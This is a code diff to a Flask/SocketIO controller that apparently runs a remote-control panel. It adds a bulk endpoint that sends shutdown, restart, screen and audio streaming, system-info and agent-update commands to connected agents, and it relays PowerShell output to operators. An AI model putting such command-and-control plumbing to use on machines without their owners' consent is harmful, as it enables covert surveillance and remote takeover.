@@ -2316,6 +2316,116 @@ def get_agent_details(agent_id):
     
     return jsonify(agent_info)
 
+# Bulk Actions API
+@app.route('/api/actions/bulk', methods=['POST'])
+@require_auth
+def bulk_action():
+    """Execute a bulk action on all or selected agents"""
+    print("\n" + "="*80)
+    print("🔍 BULK ACTION REQUEST RECEIVED")
+    print("="*80)
+    
+    data = request.json
+    action = data.get('action')
+    agent_ids = data.get('agent_ids', [])  # Empty list = all agents
+    
+    print(f"🔍 Action requested: {action}")
+    print(f"🔍 Agent IDs filter: {agent_ids}")
+    print(f"🔍 Current AGENTS_DATA: {list(AGENTS_DATA.keys())}")
+    
+    if not action:
+        print("❌ Error: No action provided")
+        return jsonify({'success': False, 'error': 'Action required'}), 400
+    
+    # Get target agents
+    target_agents = []
+    if agent_ids:
+        # Specific agents
+        target_agents = [aid for aid in agent_ids if aid in AGENTS_DATA]
+        print(f"🔍 Using specific agents: {target_agents}")
+    else:
+        # All online agents
+        target_agents = [
+            aid for aid, agent in AGENTS_DATA.items() 
+            if agent.get('status') == 'online'
+        ]
+        print(f"🔍 Using all online agents: {target_agents}")
+    
+    if not target_agents:
+        print("❌ Error: No agents available")
+        return jsonify({'success': False, 'error': 'No agents available'}), 400
+    
+    # Map actions to commands
+    action_map = {
+        'shutdown-all': 'shutdown',
+        'restart-all': 'restart',
+        'start-all-streams': 'start-stream',
+        'start-all-audio': 'start-audio',
+        'collect-system-info': 'systeminfo',
+        'download-logs': 'collect-logs',
+        'security-scan': 'security-scan',
+        'update-agents': 'update-agent'
+    }
+    
+    command = action_map.get(action)
+    print(f"🔍 Mapped action '{action}' to command '{command}'")
+    
+    if not command:
+        print(f"❌ Error: Invalid action '{action}'")
+        return jsonify({'success': False, 'error': 'Invalid action'}), 400
+    
+    # Execute command on all target agents
+    results = []
+    for agent_id in target_agents:
+        try:
+            agent_sid = AGENTS_DATA[agent_id].get('sid')
+            print(f"🔍 Sending to agent {agent_id} (SID: {agent_sid})")
+            print(f"   Command: {command}")
+            
+            socketio.emit('execute_command', {
+                'agent_id': agent_id,
+                'command': command,
+                'execution_id': f'bulk_{action}_{int(time.time())}'
+            }, room=agent_sid)
+            
+            print(f"✅ Command sent to {agent_id}")
+            
+            results.append({
+                'agent_id': agent_id,
+                'status': 'sent'
+            })
+            
+            # Log activity
+            emit('activity_update', {
+                'id': f'act_{int(time.time())}_{agent_id}',
+                'type': 'bulk_action',
+                'action': f'Bulk Action: {action}',
+                'details': f'Command "{command}" sent to {agent_id}',
+                'agent_id': agent_id,
+                'agent_name': AGENTS_DATA[agent_id].get('name', f'Agent-{agent_id}'),
+                'timestamp': datetime.datetime.utcnow().isoformat() + 'Z',
+                'status': 'success'
+            }, room='operators', broadcast=True)
+            
+        except Exception as e:
+            print(f"❌ Error sending to {agent_id}: {e}")
+            results.append({
+                'agent_id': agent_id,
+                'status': 'failed',
+                'error': str(e)
+            })
+    
+    print(f"✅ Bulk action complete: {len(results)} commands sent")
+    print("="*80)
+    
+    return jsonify({
+        'success': True,
+        'action': action,
+        'total_agents': len(target_agents),
+        'results': results,
+        'message': f'{action} executed on {len(target_agents)} agent(s)'
+    })
+
 # Streaming Control API
 @app.route('/api/agents/<agent_id>/stream/<stream_type>/start', methods=['POST'])
 @require_auth
@@ -4119,23 +4229,35 @@ def handle_command_result(data):
     success = data.get('success', False)
     execution_time = data.get('execution_time', 0)
     
+    # ✅ CRITICAL FIX: Extract PowerShell v2.1 fields
+    formatted_text = data.get('formatted_text', '')
+    terminal_type = data.get('terminal_type', 'legacy')
+    prompt = data.get('prompt', 'PS C:\\>')
+    exit_code = data.get('exit_code', 0)
+    
     print(f"🔍 Controller: Processing command result for agent {agent_id}")
     print(f"🔍 Controller: Command: {command}")
     print(f"🔍 Controller: Output length: {len(output)}")
+    print(f"🔍 Controller: formatted_text length: {len(formatted_text)}")
+    print(f"🔍 Controller: terminal_type: {terminal_type}")
     print(f"🔍 Controller: Agent exists in AGENTS_DATA: {agent_id in AGENTS_DATA}")
     
-    # Broadcast command result to operators
+    # ✅ Broadcast command result to operators (include ALL fields from agent)
     result_data = {
         'agent_id': agent_id,
         'execution_id': execution_id,
         'command': command,
         'output': output,
+        'formatted_text': formatted_text,  # ✅ CRITICAL: Pass through formatted_text!
+        'terminal_type': terminal_type,     # ✅ PowerShell metadata
+        'prompt': prompt,                   # ✅ PowerShell prompt
+        'exit_code': exit_code,             # ✅ Exit code
         'success': success,
         'execution_time': execution_time,
         'timestamp': datetime.datetime.utcnow().isoformat() + 'Z'
     }
     
-    print(f"🔍 Controller: Broadcasting to operators room: {result_data}")
+    print(f"🔍 Controller: Broadcasting to operators room with formatted_text: {len(formatted_text)} chars")
     emit('command_result', result_data, room='operators', broadcast=True)
     print(f"🔍 Controller: Command result broadcasted successfully")
     
